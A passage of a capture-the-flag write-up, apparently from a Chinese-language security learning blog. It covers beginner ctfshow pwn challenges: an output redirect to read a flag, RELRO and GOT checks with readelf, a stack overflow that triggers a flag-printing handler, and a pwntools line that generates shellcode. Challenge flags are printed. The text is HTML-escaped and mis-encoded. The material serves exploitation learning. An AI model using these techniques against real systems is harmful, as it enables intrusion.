		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;206&#34;
		data-flex-basis=&#34;496px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨IDAä¸Šçœ‹åˆ°ï¼Œæ˜¯ç”±readå’Œsystemå‡½æ•°çš„ï¼ŒæŒ‰é“ç†æˆ‘ç›´æ¥cat /ctf*åº”è¯¥å°±å‡ºflagäº†å•Š&amp;hellip;&lt;/p&gt;
&lt;p&gt;é—®é¢˜å°±å‡ºåœ¨è¿™ä¸ªfcloseå‡½æ•°ï¼ˆç¡®å®æ²¡è¾™äº†ï¼Œåªèƒ½ç”¨AIè§£é‡Šä¸€ä¸‹äº†ï¼‰ä½œç”¨æ˜¯å…³é—­æ–‡ä»¶è¾“å‡ºæµï¼Œæ ‡å‡†è¾“å‡ºè¢«å…³é—­äº†ï¼ˆæ— æ³•æ˜¾ç¤ºï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;é‚£è¿˜æœ‰&lt;strong&gt;è¾“å…¥æµ&lt;/strong&gt;å•Šï¼Œå¯ä»¥ç”¨é‡å®šå‘ï¼š&lt;strong&gt;&lt;code&gt;1&amp;gt;&amp;amp;0&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ˜¯ Linux çš„ I/O é‡å®šå‘è¯­æ³•ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt; ä»£è¡¨&lt;strong&gt;æ ‡å‡†è¾“å‡ºï¼ˆstdoutï¼‰&lt;/strong&gt;ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œå‘½ä»¤çš„è¾“å‡ºä¼šé€åˆ°è¿™é‡Œï¼Œæ˜¾ç¤ºåœ¨ç»ˆç«¯ï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt; ä»£è¡¨&lt;strong&gt;æ ‡å‡†è¾“å…¥ï¼ˆstdinï¼‰&lt;/strong&gt;ï¼ˆæ­£å¸¸æƒ…å†µä¸‹ï¼Œç”¨æˆ·è¾“å…¥ä»è¿™é‡Œè¯»å–ï¼Œé€šå¸¸æŒ‡å‘ç»ˆç«¯ï¼‰ï¼›&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&amp;gt;&amp;amp;0&lt;/code&gt; è¡¨ç¤ºï¼š&lt;strong&gt;å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°æ ‡å‡†è¾“å…¥æ‰€æŒ‡å‘çš„ä½ç½®&lt;/strong&gt;ã€‚&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å› ä¸ºä»£ç ä¸­æ ‡å‡†è¾“å‡ºè¢«å…³é—­äº†ï¼ˆæ— æ³•æ˜¾ç¤ºï¼‰ï¼Œä½†æ ‡å‡†è¾“å…¥ï¼ˆé€šå¸¸æ˜¯ç»ˆç«¯ï¼‰ä»ç„¶å¯ç”¨ï¼Œæ‰€ä»¥é€šè¿‡è¿™ä¸ªé‡å®šå‘ï¼Œ&lt;code&gt;cat&lt;/code&gt; å‘½ä»¤çš„è¾“å‡ºä¼šè¢« â€œè½¬ç§»â€ åˆ°æ ‡å‡†è¾“å…¥å¯¹åº”çš„ç»ˆç«¯ï¼Œä»è€Œè®©å†…å®¹èƒ½æ˜¾ç¤ºå‡ºæ¥ã€‚&lt;/p&gt;
&lt;p&gt;ç®€å•è¯´å°±æ˜¯ï¼šæ­£å¸¸æ˜¾ç¤ºå†…å®¹çš„ â€œè¾“å‡ºé€šé“â€ è¢«å…³äº†ï¼Œä½†æ¥æ”¶è¾“å…¥çš„ â€œè¾“å…¥é€šé“â€ è¿˜èƒ½ç”¨ã€‚é€šè¿‡ 1&amp;gt;&amp;amp;0 æŠŠåŸæœ¬è¯¥ä» â€œè¾“å‡ºé€šé“â€ æ˜¾ç¤ºçš„å†…å®¹ï¼Œè½¬åˆ° â€œè¾“å…¥é€šé“â€ å¯¹åº”çš„ç»ˆç«¯ä¸Šï¼Œè¿™æ ·å°±èƒ½çœ‹åˆ° flag äº†ã€‚ctfshow{a390a91b-5203-46ae-812d-0396de95184f}&lt;/p&gt;
&lt;p&gt;æœ¬è´¨ä¸Šæ˜¯åˆ©ç”¨äº† â€œè¾“å…¥é€šé“å’Œç»ˆç«¯è¿˜è¿ç€â€ è¿™ä¸ªæ¼æ´ï¼Œè®©å†…å®¹ â€œå€Ÿé“â€ æ˜¾ç¤ºå‡ºæ¥ï½ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/49.png&#34;
	width=&#34;1030&#34;
	height=&#34;550&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/49_hu_9e7f3c9c7cb0a617.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/49_hu_2a293b314017f370.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;é‡å®šå‘&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;187&#34;
		data-flex-basis=&#34;449px&#34;
	
&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_020&#34;&gt;PWN_020
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}&lt;/p&gt;
&lt;p&gt;è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€&lt;/p&gt;
&lt;p&gt;å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_020&#34; &gt;PWN_020&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/50.png&#34;
	width=&#34;600&#34;
	height=&#34;155&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/50_hu_5395d84a6ce1faca.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/50_hu_d78e65288b53f8ce.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;387&#34;
		data-flex-basis=&#34;929px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨è¿™é‡Œåªå¼€äº†NXä¿æŠ¤ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/51.png&#34;
	width=&#34;755&#34;
	height=&#34;264&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/51_hu_ec1407a9bbbb57d8.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/51_hu_5eec920743e7e000.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;Hintæç¤ºï¼šä»€ä¹ˆæ˜¯RETROä¿æŠ¤&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;285&#34;
		data-flex-basis=&#34;686px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;åœ¨&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-1/#relro&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-1çš„Linuxå®‰å…¨é˜²æŠ¤æœºåˆ¶&lt;/a&gt;è¿™ä¸€ç« çš„å­¦ä¹ ä¸­ï¼Œæˆ‘ä»¬æœ‰è®¤è¯†åˆ°RELROè¿™ä¸ªä¿æŠ¤ã€‚å¾ˆæ˜¾ç„¶no RELROæ„å‘³ç€.gotå’Œ.got.pltè¡¨éƒ½å¯å†™ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨æŒ‡ä»¤æŸ¥è¡¨åœ°å€ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;readelf -S PWN_020
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/52.png&#34;
	width=&#34;1044&#34;
	height=&#34;630&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/52_hu_9e02d9e9ca78633b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/52_hu_cfc6139e4ad6cdf.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;165&#34;
		data-flex-basis=&#34;397px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è€å¿ƒæ‰¾ä¸€ä¸‹å°±æ‰¾åˆ°äº†ï¼Œæ•…flag:ctfshow{1_1_0x600f18_0x600f28}&lt;/p&gt;
&lt;h3 id=&#34;pwn_021&#34;&gt;PWN_021
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}&lt;/p&gt;
&lt;p&gt;è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€&lt;/p&gt;
&lt;p&gt;å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_021&#34; &gt;PWN_021&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;checksecä¸€ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/53.png&#34;
	width=&#34;1215&#34;
	height=&#34;610&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/53_hu_8be2513129fe3dd3.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/53_hu_b1f2d1e70b5f95ba.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;partial Relroä¿æŠ¤&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;199&#34;
		data-flex-basis=&#34;478px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¦è¿˜ä¸è®°å¾—Relroä¿æŠ¤æœºåˆ¶åŸç†çš„å°±å›PWN-1å»çœ‹å§&amp;hellip;&lt;/p&gt;
&lt;p&gt;è¿™é‡Œæ˜¯ GOT è¡¨çš„å‰åŠéƒ¨åˆ†ï¼ˆ.got.pltï¼‰è®¾ç½®ä¸ºåªè¯»ï¼ŒååŠéƒ¨åˆ†ï¼ˆ.gotï¼‰ä»å¯å†™ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨readelfå‘½ä»¤å»çˆ±çœ‹è¡¨åœ°å€å°±å¥½äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/54.png&#34;
	width=&#34;670&#34;
	height=&#34;114&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/54_hu_8d769b287fb3ac64.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/54_hu_3cbf63d5305f0ffc.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;587&#34;
		data-flex-basis=&#34;1410px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;flag:ctfshow{0_1_0x600ff0_0x601000}&lt;/p&gt;
&lt;h3 id=&#34;pwn_021-1&#34;&gt;PWN_021
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šæäº¤ctfshow{ã€.gotè¡¨ä¸.got.pltæ˜¯å¦å¯å†™(å¯å†™ä¸º1ï¼Œä¸å¯å†™ä¸º0)ã€‘,ã€.gotçš„åœ°å€ã€‘,ã€.got.pltçš„åœ°å€ã€‘}&lt;/p&gt;
&lt;p&gt;ä¾‹å¦‚ .gotå¯å†™.got.pltè¡¨å¯å†™å…¶åœ°å€ä¸º0x400820 0x8208820&lt;/p&gt;
&lt;p&gt;æœ€ç»ˆflagä¸ºctfshow{1_1_0x400820_0x8208820}&lt;/p&gt;
&lt;p&gt;è‹¥æŸä¸ªè¡¨ä¸å­˜åœ¨ï¼Œåˆ™æ— éœ€å†™å…¶å¯¹åº”åœ°å€&lt;/p&gt;
&lt;p&gt;å¦‚ä¸å­˜åœ¨.got.pltè¡¨ï¼Œåˆ™æœ€ç»ˆflagå€¼ä¸ºctfshow{1_0_0x400820}&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_021&#34; &gt;PWN_021&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;é“ç†ä¸€æ ·checksecçœ‹relroçš„ä¿æŠ¤ã€readelfçœ‹è¡¨&amp;hellip;..&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/55.png&#34;
	width=&#34;725&#34;
	height=&#34;153&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/55_hu_4f21e41ae9717f96.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/55_hu_9ef604a41c7706ab.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;.gotã€.got.pltè¡¨éƒ½ä¸å¯å†™&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;473&#34;
		data-flex-basis=&#34;1137px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/56.png&#34;
	width=&#34;705&#34;
	height=&#34;101&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/56_hu_fd84664444ae0205.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/56_hu_beb3fc8924561d37.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;698&#34;
		data-flex-basis=&#34;1675px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™æ¬¡å°±åªæœ‰ä¸€ä¸ª.gotè¡¨äº†ï¼Œé‚£å°±æ˜¯flagï¼šctfshow{0_0_0x600fc0}&lt;/p&gt;
&lt;h3 id=&#34;pwn_023&#34;&gt;PWN_023
&lt;/h3&gt;&lt;p&gt;é¢˜ç›®ï¼šç”¨æˆ·åä¸º ctfshow å¯†ç  ä¸º 123456 è¯·ä½¿ç”¨ sshè½¯ä»¶è¿æ¥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ssh ctfshow@é¢˜ç›®åœ°å€ -pé¢˜ç›®ç«¯å£å·
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;ä¸æ˜¯ncè¿æ¥&lt;/strong&gt;   &lt;a class=&#34;link&#34; href=&#34;PWN_023&#34; &gt;PWN_023&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/57.png&#34;
	width=&#34;695&#34;
	height=&#34;140&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/57_hu_55b6f42bf446c46b.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/57_hu_a8dd5de87eab3f4f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;checksecä¸€ä¸‹&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;496&#34;
		data-flex-basis=&#34;1191px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;æ²¡æœ‰canaryä¿æŠ¤ï¼Œè¿™å¯ä»¥æ˜¯ä¸ªçªç ´ç‚¹ï¼šæ ˆæº¢å‡ºæ¼æ´ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹å›IDAï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/58.png&#34;
	width=&#34;1060&#34;
	height=&#34;615&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/58_hu_803795aedfc75284.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/58_hu_31f0d9d5938f057f.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;172&#34;
		data-flex-basis=&#34;413px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›ctfshowå‡½æ•°&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/59.png&#34;
	width=&#34;669&#34;
	height=&#34;159&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/59_hu_14eb223bc3e77877.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/59_hu_99cf8a4061518c1e.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;420&#34;
		data-flex-basis=&#34;1009px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å¯ä»¥çŸ¥é“ï¼Œä¸€å¼€å§‹dgetså‡½æ•°è¯»å–flagå­—ç¬¦ä¸²åˆ°å†…å­˜ä¸­&lt;/p&gt;
&lt;p&gt;è·Ÿè¿›signalå‡½æ•°ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/60.png&#34;
	width=&#34;529&#34;
	height=&#34;139&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/60_hu_e4f58d85598c5ca3.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/60_hu_e7413abc36f52d2b.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;380&#34;
		data-flex-basis=&#34;913px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;è¿™è¡Œä»£ç ä¼šå°†å†…å­˜ä¸­å­˜å‚¨çš„ &lt;code&gt;flag&lt;/code&gt; å­—ç¬¦ä¸²ï¼Œè¾“å‡ºåˆ°æ ‡å‡†é”™è¯¯æµï¼ˆ&lt;code&gt;stderr&lt;/code&gt;ï¼‰ã€‚å› ä¸ºç¨‹åºå¯åŠ¨æ—¶å·²ç»é€šè¿‡ &lt;code&gt;fgets&lt;/code&gt; ä» &lt;code&gt;/ctfshow_flag&lt;/code&gt; æ–‡ä»¶è¯»å–äº† flag å†…å®¹åˆ° &lt;code&gt;flag&lt;/code&gt; å˜é‡ä¸­ï¼Œæ‰€ä»¥è¿™é‡Œèƒ½ç›´æ¥æ‰“å°å‡ºæ­£ç¡®çš„ flagã€‚&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥è¯´æˆ‘ä»¬è®©ç¨‹åºæŠ¥é”™ä¹Ÿå°±æ˜¯è®©å®ƒæ ˆæº¢å‡ºï¼Œè¦†ç›–åçš„åœ°å€è¿˜ä¸èƒ½æ˜¯æœ‰æ•ˆåœ°å€ï¼Œè®©å®ƒå…¨éƒ¨æŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥è¾“å…¥å¥½å¤šä¸ªaå°±è¡Œï¼Œå‡ åä¸ªaçš„16è¿›åˆ¶åœ°å€æ˜¯æ— æ•ˆåœ°å€ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/61.png&#34;
	width=&#34;945&#34;
	height=&#34;394&#34;
	srcset=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/61_hu_dbfd74188df09469.png 480w, https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/61_hu_a8d8dd6c093b2cde.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;239&#34;
		data-flex-basis=&#34;575px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;å…³äºæ ˆæº¢å‡ºè¿™éƒ¨åˆ†ï¼Œè¯·çœ‹&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/pwn-2/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PWN-2&lt;/a&gt;è¯¦ç»†å­¦ä¹ ï¼ŒPWNæ¿å—å æ¯”ä¹Ÿæ˜¯é‡è¦çš„ã€‚&lt;/p&gt;
&lt;p&gt;é€æ¸å¼€å§‹ä¸Šå¼ºåº¦äº†ï¼Œè¿™æ—¶éœ€è¦ä»”ç»†çœ‹IDAçš„ä»£ç åˆ†æäº†ï¼Œçœ‹çœ‹æ˜¯ä»€ä¹ˆå·¥ä½œåŸç†ã€‚&lt;/p&gt;
&lt;p&gt;flagï¼šctfshow{0f207f1f-71bb-4cdd-bdab-7bfb9acde27a}&lt;/p&gt;
&lt;h3 id=&#34;pwn_024&#34;&gt;PWN_024
&lt;/h3&gt;&lt;h4 id=&#34;é¢˜ç›®&#34;&gt;é¢˜ç›®ï¼š
&lt;/h4&gt;&lt;p&gt;ä½ å¯ä»¥ä½¿ç”¨&lt;code&gt;pwntools&lt;/code&gt;çš„&lt;code&gt;shellcraft&lt;/code&gt;æ¨¡å—æ¥è¿›è¡Œæ”»å‡»&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;PWN_024&#34; &gt;PWN_024&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;æˆ‘æ¥ä»‹ç»ä¸€ä¸‹shellcraftæ¨¡å—ï¼šå®ƒæ˜¯ pwntools åº“ä¸­çš„ä¸€ä¸ªå­æ¨¡å—ï¼Œç”¨äºç”Ÿæˆå„ç§ä¸åŒä½“ç³»ç»“æ„çš„ Shellcodeï¼ˆè¿™é‡Œçš„ä¸åŒä½“ç³»æ˜¯æˆ‘ä»¬ä¹‹å‰å­¦è¿‡çš„&lt;a class=&#34;link&#34; href=&#34;https://expl0rer.top/p/%e7%bd%91%e5%ae%89%e5%ad%a6%e4%b9%a0%e7%ac%ac%e4%b8%80%e9%98%b6%e6%ae%b5/#%e6%93%8d%e4%bd%9c%e7%b3%bb%e7%bb%9f%e5%9f%ba%e7%a1%80&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;æ“ä½œç³»ç»ŸåŸºç¡€çš„æœ‰å…³shellçš„é‚£ä¸€ç« èŠ‚&lt;/a&gt;ï¼‰æœ‰zshã€bashç­‰ã€‚Shellcode æ˜¯ä¸€æ®µä»¥äºŒè¿›åˆ¶å½¢å¼ç¼–å†™çš„ä»£ç ï¼Œç”¨äºåˆ©ç”¨è½¯ä»¶æ¼æ´ã€æ‰§è¡Œç‰¹å®šæ“ä½œæˆ–è·å–ç³»ç»Ÿæƒé™ã€‚shellcraft æ¨¡å—æä¾›äº†ä¸€ç³»åˆ—å‡½æ•°å’Œæ–¹æ³•ï¼Œç”¨äºç”Ÿæˆç‰¹å®šä½“ç³»ç»“æ„ä¸‹çš„Shellcodeã€‚&lt;/p&gt;
&lt;p&gt;ç”Ÿæˆçš„æ±‡ç¼–ä»£ç å¯ç›´æ¥é€šè¿‡ asm() å‡½æ•°è½¬æ¢ä¸ºæœºå™¨ç ï¼ˆäºŒè¿›åˆ¶ï¼‰ï¼Œæ— éœ€æ‰‹åŠ¨å¤„ç†æ ¼å¼ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;shellcode&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;asm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;shellcraft&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i386&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;sh&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt;  &lt;span class=&#34;c1&#34;&gt;# ä¸€æ­¥å®Œæˆâ€œæ±‡ç¼–æ¨¡æ¿â†’æœºå™¨ç â€è½¬æ¢ï¼Œç±»ä¼¼Cè¯­è¨€çš„ç¼–è¯‘å™¨åŠŸèƒ½ï¼Œè½¬æ¢æˆæœºå™¨è¯­è¨€ã€‚&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;IDAï¼šå¯ä»¥çœ‹åˆ°è¿™é¢˜ä¼¼ä¹å’Œret2shellcodeæœ‰å…³&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://expl0rer.top/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/63.png&#34;
	width=&#34;1045&#34;
	height=&#34;415&#34;
